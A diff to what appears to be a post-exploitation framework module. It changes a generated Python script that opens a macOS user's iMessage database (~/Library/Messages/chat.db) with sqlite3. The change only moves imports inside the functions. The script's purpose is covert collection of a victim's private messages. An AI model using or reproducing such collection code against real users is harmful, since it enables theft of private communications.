@@ -63,13 +63,11 @@ class Module:
 
     def generate(self):
         script = """
-import sqlite3
-import datetime
-import re
-
 def func():
     try:
+        # I had to call within the target function
         from os.path import expanduser
+        import sqlite3
         home = expanduser("~") + '/Library/Messages/chat.db'
         # Open the database handle for the user
         conn = sqlite3.connect(home)
@@ -120,11 +118,13 @@ def func():
     # Close the Database handle
 
 def TimeConv(epoch):
+    import datetime
     d = datetime.datetime.strptime("01-01-1904", "%m-%d-%Y")
     time = (d + datetime.timedelta(seconds=epoch)).strftime("%a, %d %b %Y %H:%M:%S GMT")
     return time
     
 def RemoveUnicode(string):
+        import re
         try:
             string_data = string
             if string_data is None:
